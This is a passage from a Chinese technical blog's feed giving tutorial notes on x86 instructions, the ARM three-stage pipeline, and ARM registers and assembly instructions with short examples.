class="headerlink" title="EIP"></a>EIP</h3><p>存储我们cpu要读取指令的地址</p><h3 id="TSC"><a href="#TSC" class="headerlink" title="TSC"></a>TSC</h3><p>一个用于时间戳计数器的64位的寄存器，它在每个时钟信号到来时加一</p><h2 id="指令集"><a href="#指令集" class="headerlink" title="指令集"></a>指令集</h2><h3 id="数据传送指令"><a href="#数据传送指令" class="headerlink" title="数据传送指令"></a>数据传送指令</h3><h4 id="MOV"><a href="#MOV" class="headerlink" title="MOV"></a>MOV</h4><p>mov指令将第二个操作数（可以是寄存器的内容、内存中的内容或值）复制到第一个操作数（寄存器或内存）。mov不能用于直接从内存复制到内存</p><h4 id="push"><a href="#push" class="headerlink" title="push"></a>push</h4><p>push指令将操作数压入内存的栈中</p><h4 id="pop"><a href="#pop" class="headerlink" title="pop"></a><strong>pop</strong></h4><p>与push相反，将操作数从栈中取出</p><h4 id="lea"><a href="#lea" class="headerlink" title="lea"></a><strong>lea</strong></h4><p> lea实际上是一个载入有效地址指令，将第二个操作数表示的地址载入到第一个操作数（寄存器）中 lea实际上是一个载入有效地址指令，将第二个操作数表示的地址载入到第一个操作数（寄存器）中。</p><h3 id="算术和逻辑指令"><a href="#算术和逻辑指令" class="headerlink" title="算术和逻辑指令"></a>算术和逻辑指令</h3><h4 id="ADD"><a href="#ADD" class="headerlink" title="ADD"></a>ADD</h4><p>将两个操作数相加，且将相加后的结果保存到第一个操作数中。</p><h4 id="SUB"><a href="#SUB" class="headerlink" title="SUB"></a>SUB</h4><p>第一个操作数减去第二个操作数，并将相减后的值保存在第一个操作数。</p><h4 id="INC和DEC"><a href="#INC和DEC" class="headerlink" title="INC和DEC"></a>INC和DEC</h4><p>inc,dec分别表示将操作数自加1，自减1。</p><h4 id="IMUL"><a href="#IMUL" class="headerlink" title="IMUL"></a>IMUL</h4><p>整数相乘指令，它有两种指令格式，一种为两个操作数，将两个操作数的值相乘，并将结果保存在第一个操作数中，第一个操作数必须为寄存器；第二种格式为三个操作数，其语义为：将第二个和第三个操作数相乘，并将结果保存在第一个操作数中，第一个操作数必须为寄存器</p><h4 id="IDIV"><a href="#IDIV" class="headerlink" title="IDIV"></a>IDIV</h4><p>idiv指令完成整数除法操作，idiv只有一个操作数，此操作数为除数，而被除数则为EDX:EAX中的内容（一个64位的整数）。</p><h4 id="AND-OR-XOR"><a href="#AND-OR-XOR" class="headerlink" title="AND, OR, XOR"></a>AND, OR, XOR</h4><p>逻辑与、逻辑或、逻辑异或操作指令，用于操作数的位操作，操作结果放在第一个操作数中。</p><h4 id="NOT"><a href="#NOT" class="headerlink" title="NOT"></a>NOT</h4><p>位翻转指令，将操作数中的每一位翻转，即0-&gt;1, 1-&gt;0。</p><h4 id="NEG"><a href="#NEG" class="headerlink" title="NEG"></a>NEG</h4><p>取负指令。</p><h4 id="SHL-SHR"><a href="#SHL-SHR" class="headerlink" title="SHL, SHR"></a>SHL, SHR</h4><p>位移指令，有两个操作数，第一个操作数表示被操作数，第二个操作数指示位移的数量。</p><h3 id="控制转移指令"><a href="#控制转移指令" class="headerlink" title="控制转移指令"></a>控制转移指令</h3><h4 id="JMP"><a href="#JMP" class="headerlink" title="JMP"></a>JMP</h4><p>控制转移到label所指示的地址。</p><h4 id="jcondition"><a href="#jcondition" class="headerlink" title="jcondition"></a>jcondition</h4><p>条件转移指令，条件转移指令依据机器状态字中的一些列条件状态转移。机器状态字中包括指示最后一个算数运算结果是否为0，运算结果是否为负数等。</p><blockquote><p>je <label> (jump when equal)<br>jne <label> (jump when not equal)<br>jz <label> (jump when last result was zero)<br>jg <label> (jump when greater than)<br>jge <label> (jump when greater than or equal to)<br>jl <label> (jump when less than)<br>jle <label>(jump when less than or equal to)</p></blockquote><h4 id="CMP"><a href="#CMP" class="headerlink" title="CMP"></a>CMP</h4><p>cmp指令比较两个操作数的值，并根据比较结果设置机器状态字中的条件码。此指令与sub指令类似，但是cmp不用将计算结果保存在操作数中。</p><h4 id="CALL-RET"><a href="#CALL-RET" class="headerlink" title="CALL, RET"></a>CALL, RET</h4><p>这两条指令实现子程序（过程、函数等意思）的调用及返回。call指令首先将当前执行指令地址入栈，然后无条件转移到由标签指示的指令。与其它简单的跳转指令不同，call指令保存调用之前的地址信息（当call指令结束后，返回到调用之前的地址）。</p><p>ret指令实现子程序的返回机制，ret指令弹出栈中保存的指令地址，然后无条件转移到保存的指令地址执行。</p>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>三级流水线</title>
    <link href="/article/f5705223.html"/>
    <url>/article/f5705223.html</url>
    
    <content type="html"><![CDATA[<p>一般处理器执行代码程序为，读一条，执行一条</p><p>而流水线则使用三个阶段处理：</p><p>取指，从储存器中取出指令</p><p>译码，识别指令</p><p>执行，处理指令，并将结果放回寄存器</p><p>arm可以在执行第一条指令的时候，对第二条指令进行译码，并且取出第三条指令</p><p>但是！</p><p>无论处理器处于何种状态，程序计数器R15(PC)总是指向“正在取指”的指令，而不是指向“正在执行”的指令或者正在“译码”的指令</p><p>人们常以正在执行的指令做第一条参考，所以pc总是指向第三条指令，或者说是指向正在执行的指令地址再加两条指令地址</p><p>处理器处于ARM状态时，每条指令为4个字节，所以PC值为正在执行的指令地址加8字节，即是：</p><p>PC值 &#x3D; 当前程序执行位置 + 8字节</p><p>处理器处于Thumb状态时，每条指令为2字节，所以PC值为正在执行的指令地址加4字节，即是：</p><p>PC值 &#x3D; 当前程序执行位置 + 4字节</p>]]></content>
    
    
    <categories>
      
      <category>一些杂七杂八的技术</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ARM寄存器及其汇编指令</title>
    <link href="/article/c21195a7.html"/>
    <url>/article/c21195a7.html</url>
    
    <content type="html"><![CDATA[<h2 id="ARM处理器"><a href="#ARM处理器" class="headerlink" title="ARM处理器"></a>ARM处理器</h2><p>第一款RISC（精简指令集）微处理器，（arm）32位设计，但配有16位指令集（thumb）</p><p>32位和16位可以相互调用，且开销几乎为0</p><p>使用大量寄存器，功耗低，效率高</p><p>ps：具体发展，系列之类请参考百度百科：<a href="https://baike.baidu.com/item/arm/5907">https://baike.baidu.com/item/arm/5907</a></p><h2 id="arm寄存器"><a href="#arm寄存器" class="headerlink" title="arm寄存器"></a>arm寄存器</h2><p>arm包括37个寄存器，都是32位</p><p>31个通用寄存器，6个状态寄存器</p><p>arm有7种处理器模式，每个模式中有一组相应的寄存器</p><p>在任何一种处理器模式下可见的寄存器包括15个通用寄存器（r0-r14），一个或者两个状态寄存器，程序技术器（pc）</p><p>所有寄存器中，有些是各模式公用的物理寄存器，有些是某个模式独立拥有的物理寄存器</p><blockquote><p> 七个处理器模式： 用户模式（User），快速中断模式（FIQ），普通中断模式（IRQ），管理模式（Svc），数据访问中止模</p><p>（Abort），未定义指令中止模式（Und），系统模式（Sys）</p></blockquote><h3 id="寄存器用途"><a href="#寄存器用途" class="headerlink" title="寄存器用途"></a>寄存器用途</h3><p>r0 - r3：传参</p><p>r4 - r11：保存局部变量，但在thumb（16位程序）中，通常只能用r4-r7来保存局部变量</p><p>r12：ip寄存器 </p><p>r13：栈帧，即sp</p><p>r14：lr，被称为连接寄存器，用于保存子程序以及中断的返回地址</p><p>r15：程序计数器，即pc，但由于arm使用的是三级流水线结构，所以我们读取正确的pc的值之后应该在该值基础上加八个字节，即指向pc下两条指令的地址</p><blockquote><p>ps：关于三级流水线，另一片相关文章会具体解释</p></blockquote><p>CPSR：当前程序状态寄存器，在任何模式下可以被访问。包含条件标志位、中断禁止位、当前处理器模式标志以及其他的一些控制和状态位。CPSR在用户编程时由于存储条件码。</p><p>SPSR：每一种模式下都有一个状态寄存器SPSR，用于保存CPSR的状态，以便异常返回后恢复异常发生时的工作状态。用户模式和系统模式不是异常状态，所以没有SPSR，在这两种模式下访问SPSR，将产生不可预知的后果。</p><h3 id="CPSR详解："><a href="#CPSR详解：" class="headerlink" title="CPSR详解："></a>CPSR详解：</h3><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140909199.png" alt="image-20220402140909199"></p><blockquote><p>ps：长度为32</p></blockquote><p>cpsr包括条件标志位、中断禁止位、当前处理器模式标志以及其他的一些控制和状态位</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140916144.png" alt="image-20220402140916144"></p><p>通过上图就可以理解cpsr_cxsf的意思了</p><h4 id="条件码标志"><a href="#条件码标志" class="headerlink" title="条件码标志"></a>条件码标志</h4><p>N：结果是有符号的二进制补码情况下，结果为负的话N&#x3D;1，结果为非负的话N&#x3D;0</p><p>Z：结果如果为零的话Z&#x3D;1，结果非零的话Z&#x3D;0</p><p>C：有多种情况</p><blockquote><p>对于加法指令（包括比较指令CMN），产生进位的话C&#x3D;1，否则C&#x3D;0。</p><p>对于减法指令（包括比较指令CMP），如果产生借位，则C&#x3D;0;否则C&#x3D;1。</p><p>对于有移位操作的非法指令，C为移位操作中最后移出位的值。</p><p>对于其他指令，C通常不变。</p><p>ps：比较指令CMN与CMP其实才是算数指令，之后会有详解</p></blockquote><p>V：对于加减法指令，在操作数和结果是有符号的整数时，如果发生溢出，则V&#x3D;1；如果无溢出发生，则V&#x3D;0；对于其他指令，V通常不发生变化</p><h2 id="ARM指令集"><a href="#ARM指令集" class="headerlink" title="ARM指令集"></a>ARM指令集</h2><h3 id="指令格式"><a href="#指令格式" class="headerlink" title="指令格式"></a>指令格式</h3><blockquote><p> <opcode>    {<cond>}    {S}    <Rd>    ,    <Rn>    {,<opcode2>}</p></blockquote><p><code>&lt;&gt;</code>内是必须项，<code>&#123;&#125;</code>内是可选项，<code>不写</code>代表无条件执行</p><p>opcode    指令助记符，如LDR，STR 等</p><p>cond    执行条件，如EQ，NE 等</p><p>S    是否影响CPSR 寄存器的值，书写时影响CPSR，否则不影响</p><p>Rd    目标寄存器</p><p>Rn    第一个操作数的寄存器</p><p>operand2    第二个操作数</p><h3 id="储存器访问指令"><a href="#储存器访问指令" class="headerlink" title="储存器访问指令"></a>储存器访问指令</h3><p>ARM 处理是加载&#x2F;存储体系结构的典型的RISC处理器</p><p>对存储器的访问只能使用加载和存储指令实现</p><p>ARM 的加载&#x2F;存储指令是可以实现字、半字、无符&#x2F;有符字节操作</p><p>批量加载&#x2F;存储指令可实现一条指令加载&#x2F;存储多个寄存器的内容</p><p>SWP指令是一条寄存器和存储器内容交换的指令，可用于信号量操作等</p><p>ARM 处理器是冯.诺依曼存储结构，程序空间、RAM 空间及IO 映射空间统一编址，除对对RAM 操作以外，对外围IO、程序数据的访问均要通过加载&#x2F;存储指令进行</p><p>下图给出ARM存储访问指令表</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140923882.png" alt="image-20220402140923882"></p><h4 id="LDR-x2F-STR"><a href="#LDR-x2F-STR" class="headerlink" title="LDR&#x2F;STR"></a>LDR&#x2F;STR</h4><blockquote><p>LDR{cond}{T} Rd,&lt;地址&gt;;</p></blockquote><blockquote><p>STR{cond}{T} Rd,&lt;地址&gt;;</p></blockquote><p>LDR从内存中读取数据放入寄存器，STR用于将寄存器内的数据放到内存</p><blockquote><p>LDR    R2, [R7,#0x10+var_C]     将<code>R7 + 0x10+var_C</code>地址的数据放到R2</p><p>STR    R3, [R7,#0x10+var_4]     将R3的数据储存在<code>R7 + 0x10+var_4</code></p></blockquote><p>{T}为可选项，若指令有T，那么即使处理器是在特权模式下，存储系统也将访问看成是处理器是在用户模式下</p><p>T在用户模式下无效，不能与前索引偏移一起使用T</p><blockquote><p>LDR    Rd,[Rn]    零偏移，将Rn的值作为内存地址</p><p>LDR    Rd,[Rn,#0x04]! 前索引偏移，将Rn+0x04地址的值放到Rd，并且<code>更新Rn</code>的值为Rn &#x3D; Rn + 0x04，如果没有后边感叹号，则Rn不更新</p><p>LDR    Rd,label ;  程序相对偏移，label 为程序标号，label 必须是在当前指令的±4KB范围内</p><p>LDR    Rd,[Rn],#0x04 后索引偏移，将Rn中的地址的数据加载到Rd中，然后将Rn更新Rn &#x3D; Rn + 0x04</p></blockquote><p>ps：前索引偏移就是在索引前偏移，看有无！决定时候更新寄存器的内容。后索引偏移就是在索引后偏移，索引时并不偏移，索引后更新寄存器内容</p><h4 id="LDM-x2F-STM"><a href="#LDM-x2F-STM" class="headerlink" title="LDM&#x2F;STM"></a><strong>LDM&#x2F;STM</strong></h4><blockquote><p>LDM{cond}&lt;模式&gt; Rn{!},reglist{^}</p><p>STM{cond}&lt;模式&gt; Rn{!},reglist{^}</p></blockquote><p>LDM 加载多个寄存器，STM储存多个寄存器</p><p>主要用途是现场保护、数据复制、参数传送等</p><p>其模式有8种，如下所列：(前面4 种用于数据块的传输，后面4 种是堆栈操作)</p><blockquote><p>(1) IA：每次传送后地址加4</p><p>(2) IB：每次传送前地址加4</p><p>(3) DA：每次传送后地址减4</p><p>(4) DB：每次传送前地址减4</p><p>(5) FD：满递减堆栈</p><p>(6) ED：空递增堆栈</p><p>(7) FA：满递增堆栈</p><p>(8) EA：空递增堆栈</p></blockquote><p>寄存器Rn为基址寄存器，装有传送数据的初始地址，Rn 不允许为R15；缀<code>!</code>表示最后的地址写回到Rn中</p><p>寄存器列表reglist 可包含多于一个寄存器或寄存器范围，使用“,”分开，如{R1,R2,R6-R9}，寄存器排列由小到大排列</p><p><code>^</code>后缀不允许在用户模式呈系统模式下使用，若在LDM 指令用寄存器列表中包含有PC 时使用，那么除了正常的多寄存器传送外，将SPSR 拷贝到CPSR 中，这可用于异常处理返回</p><p>使用<code>^</code>后缀进行数据传送且寄存器列表不包含PC时，加载&#x2F;存储的是用户模式的寄存器，而不是当前模式的寄存器</p><blockquote><p>LDMIA    R0!,{R3-R9} ;加载R0 指向的地址上的多字数据，保存到R3～R9中，R0 值更新</p><p>STMIA    R1!,{R3-R9} ;将R3～R9 的数据存储到R1 指向的地址上，R1值更新</p><p>STMFD    SP!,{R0-R7,LR} ;现场保存，将R0～R7、LR入栈</p><p>LDMFD SP!,{R0-R7,PC}^;恢复现场，异常处理返回</p></blockquote><h4 id="SWP-寄存器和存储器交换指令"><a href="#SWP-寄存器和存储器交换指令" class="headerlink" title="SWP 寄存器和存储器交换指令"></a>SWP 寄存器和存储器交换指令</h4><blockquote><p> SWP{cond}{B} Rd,Rm,[Rn]</p></blockquote><p>SWP指令用于将一个内存单元（该单元地址放在寄存器Rn中）的内容读取到一个寄存器Rd中，同时将另一个寄存器Rm 的内容写入到该内存单元中</p><p>B 为可选后缀，若有B，则交换字节，否则交换32 位字：Rd 为数据从存储器加载到的寄存器;Rm的数据用于存储到存储器中，若Rm 与Rn 相同，则为寄存器与存储器内容进行交换;Rn 为要进行数据交换的存储器地址，Rn 不能与Rd 和Rm 相同</p><blockquote><p>SWP R1,R1,[R0] ; 将R1 的内容与R0 指向的存储单元的内容进行交换</p><p>SWP R1,R2,,[R0] ; 将R0 指向的存储单元内容读取一字节数据到R1中(高24 位清零) ; 并将R2 的内容写入到该内存单元中(最低字节有效)</p></blockquote><h3 id="ARM-数据处理指令"><a href="#ARM-数据处理指令" class="headerlink" title="ARM 数据处理指令"></a>ARM 数据处理指令</h3><h4 id="MOV-数据传送指令"><a href="#MOV-数据传送指令" class="headerlink" title="MOV 数据传送指令"></a>MOV 数据传送指令</h4><blockquote><p>MOV{cond}{S} Rd,operand2</p></blockquote><p>将8 位立即数或寄存器(operant2)传送到目标寄存器Rd，可用于移位运算等操作</p><blockquote><p>MOV R1#0x10 ;R1&#x3D;0x10</p><p>MOV R0,R1 ;R0&#x3D;R1</p><p>MOVS R3,R1,LSL #2 ;R3&#x3D;R1＜＜2，并影响标志位</p><p>MOV PC,LR  ;PC&#x3D;LR ，子程序返回</p></blockquote><h4 id="MVN-数据非传送指令"><a href="#MVN-数据非传送指令" class="headerlink" title="MVN 数据非传送指令"></a>MVN 数据非传送指令</h4><blockquote><p>MVN{cond}{S} Rd,operand2</p></blockquote><p>将8 位图立即数或寄存器(operand2)按位取反后传送到目标寄存器(Rd)，因为其具有取反功能，所以可以装载范围更广的立即数</p><blockquote><p>MVN R1,#0xFF ;R1&#x3D;0xFFFFFF00</p><p>MVN R1,R2 ;将R2 取反，结果存到R1</p></blockquote><h4 id="ADD-加法运算指令"><a href="#ADD-加法运算指令" class="headerlink" title="ADD 加法运算指令"></a>ADD 加法运算指令</h4><blockquote><p>ADD{cond}{S} Rd,Rn,operand2</p></blockquote><p> 将operand2 数据与Rn 的值相加，结果保存到Rd 寄存器</p><blockquote><p>ADDS R1,R1,#1 ;R1&#x3D;R1+1</p><p>ADD R1,R1,R2 ;R1&#x3D;R1+R2</p><p>ADDS R3,R1,R2,LSL #2 ;R3&#x3D;R1+R2＜＜2</p></blockquote><h4 id="SUB-减法运算指令"><a href="#SUB-减法运算指令" class="headerlink" title="SUB 减法运算指令"></a>SUB 减法运算指令</h4><blockquote><p>SUB{cond}{S} Rd,Rn,operand2</p></blockquote><p>用寄存器Rn 减去operand2。结果保存到Rd 中</p><blockquote><p>SUBS R0,R0,#1 ;R0&#x3D;R0-1</p><p>SUBS R2,R1,R2 ;R2&#x3D;R1-R2</p><p>SUB R6,R7,#0x10 ;R6&#x3D;R7-0x10</p></blockquote><h4 id="RSB-逆向减法指令"><a href="#RSB-逆向减法指令" class="headerlink" title="RSB 逆向减法指令"></a>RSB 逆向减法指令</h4><blockquote><p>RSB{cond}{S} Rd,Rn,operand2</p></blockquote><p>用寄存器operand2 减法Rn，结果保存到Rd 中</p><blockquote><p>RSB R3,R1,#0xFF00 ;R3&#x3D;0xFF00-R1</p><p>RSBS R1,R2,R2,LSL #2 ;R1&#x3D;R2＜＜2-R2&#x3D;R2×3</p><p>RSB R0,R1,#0 ;R0&#x3D;-R1</p></blockquote><h4 id="ADC-带进位加法指令"><a href="#ADC-带进位加法指令" class="headerlink" title="ADC 带进位加法指令"></a><strong>ADC</strong> 带进位加法指令</h4><blockquote><p>ADC{cond}{S} Rd,Rn,operand2</p></blockquote><p>将operand2 的数据与Rn 的值相加，再加上CPSR中的C 条件标志位，结果保存到Rd 寄存器</p><blockquote><p>ADC R1,R1,R3 ;使用ADC 实现64 位加法，R1&#x3D;R1+R3</p></blockquote><h4 id="SBC-带进位减法指令"><a href="#SBC-带进位减法指令" class="headerlink" title="SBC 带进位减法指令"></a><strong>SBC</strong> 带进位减法指令</h4><blockquote><p>SCB{cond}{S}Rd,Rn,operand2</p></blockquote><p>用寄存器Rn 减去operand2，再减去CPSR 中的C条件标志位的非（即若C 标志清零，则结果减去1），结果保存到Rd 中</p><blockquote><p>SBC R1,R1,R3 ;使用SBC 实现64 位减法，R1 &#x3D; R1 - R3</p></blockquote><h4 id="RSC-带进位逆向减法指令"><a href="#RSC-带进位逆向减法指令" class="headerlink" title="RSC 带进位逆向减法指令"></a><strong>RSC</strong> 带进位逆向减法指令</h4><blockquote><p> RSC{cond}{S} Rd,Rn,operand2</p></blockquote><p>用寄存器operand2 减去Rn，再减去CPSR 中的C条件标志位，结果保存到Rd 中</p><blockquote><p>RSC R3,R1,#0 ;使用RSC 指令实现求64 位数值的负数 R3 &#x3D; 0 -R1</p></blockquote><h4 id="AND-逻辑与操作指令"><a href="#AND-逻辑与操作指令" class="headerlink" title="**AND **逻辑与操作指令"></a>**AND **逻辑与操作指令</h4><blockquote><p>AND{cond}{S} Rd,Rn,operand2</p></blockquote><p>将operand2 值与寄存器Rn 的值按位作逻辑与操作，结果保存到Rd中</p><p><code>逻辑与操作，都为1则返回1</code></p><blockquote><p>ANDS R0,R0,#x01 ;R0&#x3D;R0&amp;0x01，取出最低位数据</p><p>AND R2,R1,R3 ;R2&#x3D;R1&amp;R3</p></blockquote><h4 id="ORR-逻辑或操作指令"><a href="#ORR-逻辑或操作指令" class="headerlink" title="**ORR **逻辑或操作指令"></a>**ORR **逻辑或操作指令</h4><blockquote><p>ORR{cond}{S} Rd,Rn,operand2</p></blockquote><p>将operand2 的值与寄存器Rn的值按位作逻辑或操作，结果保存到Rd 中</p><blockquote><p>ORR R0,R0,#x0F ;将R0 的低4 位置1</p><p>MOV R1,R2,LSR #4</p><p>ORR R3,R1,R3,LSL #8 ;使用ORR 指令将近R2 的高8位数据移入到R3 低8 位中</p></blockquote><h4 id="EOR-逻辑异或操作指令"><a href="#EOR-逻辑异或操作指令" class="headerlink" title="**EOR **逻辑异或操作指令"></a>**EOR **逻辑异或操作指令</h4><blockquote><p>EOR{cond}{S}Rd,Rn,operand2</p></blockquote><p>将operand2 的值与寄存器Rn 的值按位作逻辑异或操作，结果保存到Rd中</p><blockquote><p>EOR R1,R1,#0x0F ;将R1 的低4 位取反</p><p>EOR R2,R1,R0 ;R2&#x3D;R1^R0</p><p>EORS R0,R5,#0x01 ;将R5 和0x01 进行逻辑异或，结果保存到R0，并影响标志位</p></blockquote><h4 id="BIC-位清除指令"><a href="#BIC-位清除指令" class="headerlink" title="BIC 位清除指令"></a><strong>BIC</strong> 位清除指令</h4><blockquote><p> BIC{cond}{S}Rd,Rn,operand2</p></blockquote><p>将寄存器Rn 的值与operand2 的值的反码按位作逻辑与操作，结果保存到Rd中。</p><blockquote><p>BIC R1,R1,#0x0F ;将R1 的低4 位清零，其它位不变</p><p>BIC R1,R2,R3 ;将拭的反码和R2 相逻辑与，结果保存到R1</p></blockquote><h4 id="CMP-比较指令"><a href="#CMP-比较指令" class="headerlink" title="CMP 比较指令"></a><strong>CMP</strong> 比较指令</h4><blockquote><p>CMP{cond} Rn,operand2</p></blockquote><p>指令使用寄存器Rn 的值减去operand2 的值，根据操作的结果更新CPSR中的相应条件标志位，以便后面的指令根据相应的条件标志来判断是否执行</p><p>CMP 指令不保存运算结果</p><blockquote><p>CMP R1,#10 ;R1 与10 比较，设置相关标志位</p><p>CMP R1,R2 ;R1 与R2 比较，设置相关标志位</p></blockquote><h4 id="CMN-负数比较指令"><a href="#CMN-负数比较指令" class="headerlink" title="**CMN **负数比较指令"></a>**CMN **负数比较指令</h4><blockquote><p>CMN{cond} Rn,operand2</p></blockquote><p>指令使用寄存器Rn 与值加上operand2 的值，根据操作的结果更新CPSR中的相应条件标志位，以便后面的指令根据相应的条件标志来判断是否执行</p><blockquote><p>CMN R0,#1 ;R0+1,判断R0 是否为1 的补码，若是Z 置位</p><p>CMN 指令与ADDS 指令的区别在于CMN 指令不保存运算结果。CMN指令可用于负数比较，比如CMNR0，#1 指令则表示R0 与-1 比较，若R0 为-(即1 的补码)，则Z 置位，否则Z复位。</p></blockquote><h4 id="TST-位测试指令"><a href="#TST-位测试指令" class="headerlink" title="TST 位测试指令"></a><strong>TST</strong> 位测试指令</h4><blockquote><p> TST{cond} Rn,operand2</p></blockquote><p>指令将寄存器Rn 的值与operand2 的值按位作逻辑与操作，根据操作的结果更新CPSR中相应的条件标志位(当结果为0时，EQ位被设置)，以便后面指令根据相应的条件标志来判断是否执行</p><blockquote><p>TST R0,#0x01 ;判断R0 的最低位是否为0</p><p>TST R1,#0x0F ;判断R1 的低4 位是否为0</p><p>TST 指令与ANDS 指令的区别在于TST4 指令不保存运算结果。TST指令通常于EQ、NE条件码配合使用，当所有测试位均为0 时，EQ 有效，而只要有一个测试为不为0，则NE 有效。</p></blockquote><h4 id="TEQ-相等测试指令"><a href="#TEQ-相等测试指令" class="headerlink" title="TEQ 相等测试指令"></a><strong>TEQ</strong> 相等测试指令</h4><blockquote><p> TEQ{cond} Rn,operand2</p></blockquote><p>指令寄存器Rn 的值与operand2 的值按位作逻辑异或操作，根据操作的结果更新CPSR中相应条件标志位，以便后面的指令根据相应的条件标志来判断是否执行</p><blockquote><p>TEQ R0,R1 ;比较R0 与R1 是否相等(不影响V 位和C 位)</p><p>TST 指令与EORS 指令的区别在于TST 指令不保存运算结果。使用TEQ进行相等测试，常与EQNE 条件码配合使用，当两个数据相等时，EQ 有效，否则NE 有效。</p></blockquote><h4 id="MUL-32-位乘法指令"><a href="#MUL-32-位乘法指令" class="headerlink" title="MUL 32 位乘法指令"></a><strong>MUL</strong> 32 位乘法指令</h4><blockquote><p> MUL{cond}{S} Rd,Rm,Rs</p></blockquote><p>指令将Rm 和Rs 中的值相乘，结果的低32 位保存到Rd中</p><blockquote><p>MUL R1,R2,R3 ;R1&#x3D;R2×R3</p><p>MULS R0,R3,R7 ;R0&#x3D;R3×R7，同时设置CPSR 中的N位和Z 位</p></blockquote><h4 id="MLA-32-位乘加指令"><a href="#MLA-32-位乘加指令" class="headerlink" title="MLA 32 位乘加指令"></a><strong>MLA</strong> 32 位乘加指令</h4><blockquote><p>MLA{cond}{S} Rd,Rm,Rs,Rn</p></blockquote><p> 指令将Rm 和Rs 中的值相乘，再将乘积加上第3 个操作数，结果的低32位保存到Rd 中</p><blockquote><p>MLA R1,R2,R3,R0 ;R1&#x3D;R2×R3+R0</p></blockquote><h4 id="UMULL-64-位无符号乘法指令"><a href="#UMULL-64-位无符号乘法指令" class="headerlink" title="**UMULL ** 64 位无符号乘法指令"></a>**UMULL ** 64 位无符号乘法指令</h4><blockquote><p> UMULL{cond}{S} RdLo,RdHi,Rm,Rs</p></blockquote><p>指令将Rm 和Rs 中的值作无符号数相乘，结果的低32位保存到RsLo 中，而高32 位保存到RdHi 中</p><blockquote><p>UMULL R0,R1,R5,R8 ;(R1、R0)&#x3D;R5×R8</p></blockquote><h4 id="UMLAL-64-位无符号乘加指令"><a href="#UMLAL-64-位无符号乘加指令" class="headerlink" title="UMLAL 64 位无符号乘加指令"></a><strong>UMLAL</strong> 64 位无符号乘加指令</h4><blockquote><p> UMLAL{cond}{S} RdLo,RdHi,Rm,Rs</p></blockquote><p>指令将Rm 和Rs 中的值作无符号数相乘，64 位乘积与RdHi、RdLo相加，结果的低32 位保存到RdLo 中，而高32 位保存到RdHi 中</p><blockquote><p>UMLAL R0,R1,R5,R8;(R1,R0)&#x3D;R5×R8+(R1,R0)</p></blockquote><h4 id="SMULL-64-位有符号乘法指令"><a href="#SMULL-64-位有符号乘法指令" class="headerlink" title="**SMULL **64 位有符号乘法指令"></a>**SMULL **64 位有符号乘法指令</h4><blockquote><p> SMULL{cond}{S} RdLo,RdHi,Rm,Rs</p></blockquote><p>指令将Rm 和Rs 中的值作有符号数相乘，结果的低32位保存到RdLo 中，而高32 位保存到RdHi 中</p><blockquote><p> SMULL R2,R3,R7,R6 ;(R3,R2)&#x3D;R7×R6</p></blockquote><h4 id="SMLAL-64-位有符号乘加指令"><a href="#SMLAL-64-位有符号乘加指令" class="headerlink" title="SMLAL 64 位有符号乘加指令"></a><strong>SMLAL</strong> 64 位有符号乘加指令</h4><blockquote><p> SMLAL{cond}{S} RdLo,RdHi,Rm,Rs</p></blockquote><p>指令将Rm 和Rs 中的值作有符号数相乘，64 位乘积与RdHi、RdLo，相加，结果的低32位保存到RdLo 中，而高32 位保存到RdHi 中</p><blockquote><p>SMLAL R2,R3,R7,R6;(R3,R2)&#x3D;R7×R6+(R3,R2)</p></blockquote><h3 id="ARM跳转指令"><a href="#ARM跳转指令" class="headerlink" title="ARM跳转指令"></a>ARM跳转指令</h3><h4 id="B"><a href="#B" class="headerlink" title="B"></a><strong>B</strong></h4><blockquote><p>B{cond} label</p></blockquote><p>跳转到指定的地址执行程序，跳转到指令B 限制在当前指令的±32Mb 的范围内</p><blockquote><p>B WAITA ;跳转到WAITA 标号处</p><p>B 0x1234 ;跳转到绝对地址0x1234 处</p></blockquote><h4 id="BL-带链接的跳转指令"><a href="#BL-带链接的跳转指令" class="headerlink" title="**BL **带链接的跳转指令"></a>**BL **带链接的跳转指令</h4><blockquote><p>BL{cond} label</p></blockquote><p>指令将下一条指令的地址拷贝到R14(即LR)链接寄存器中，然后跳转到指定地址运行程序</p><p>跳转指令B 限制在当前指令的±32MB 的范围内。BL 指令用于子程序调用</p><blockquote><p>BL DELAY</p></blockquote><h4 id="BX-带状态切换的跳转指令"><a href="#BX-带状态切换的跳转指令" class="headerlink" title="BX 带状态切换的跳转指令"></a><strong>BX</strong> 带状态切换的跳转指令</h4><blockquote><p> BX{cond} Rm</p></blockquote><p>跳转到Rm 指定的地址执行程序，若Rm 的位[0]为1，则跳转时自动将CPSR 中的标志T 置位，即把目标地址的代码解释为Thumb代码;若Rm 的位[0]为0，则跳转时自动将CPSR 中的标志T 复位，即把目标地址的代码解释为ARM代码</p><blockquote><p>ADRL R0,ThumbFun+1</p><p>BX R0 ;跳转到R0 指定的地址，并根据R0 的最低位来切换处理器状态</p></blockquote><h4 id="BLX"><a href="#BLX" class="headerlink" title="BLX"></a>BLX</h4><p>BLX目标地址：跳转，改变状态及保存PC值</p><h3 id="ARM-协处理器指令"><a href="#ARM-协处理器指令" class="headerlink" title="ARM 协处理器指令"></a>ARM 协处理器指令</h3><h4 id="CDP-协处理器数据操作指令"><a href="#CDP-协处理器数据操作指令" class="headerlink" title="CDP 协处理器数据操作指令"></a>CDP 协处理器数据操作指令</h4><blockquote><p>CDP{cond}coproc,opcodel,CRd,CRn,CRm{,opcode2}</p><p>coproc 指令操作的协处理器名。标准名为pn,n 为0～15。</p><p>opcodel 协处理器的特定操作码。</p><p>CRd 作为目标寄存器的协处理器寄存器。</p><p>CRN 存放第1 个操作数的协处理器寄存器。</p><p>CRm 存放第2 个操作数的协处理器寄存器。</p><p>Opcode2 可选的协处理器特定操作码。</p></blockquote><p>ARM 处理器通过CDP 指令通知ARM 协处理器执行特定的操作。该操作由协处理器完成，即对命令的参数的解释与协处理器有关，指令的使用取决于协处理器。若协处理器不能成功地执行该操作，将产生未定义指令异常中断</p><blockquote><p>CDP p7,0,c0,c2,c3,0 ;协处理器7 操作，操作码为0，可选操作码为0</p><p>CDP p6,1,c3,c4,c5 ;协处理器操作，操作码为1</p></blockquote><h4 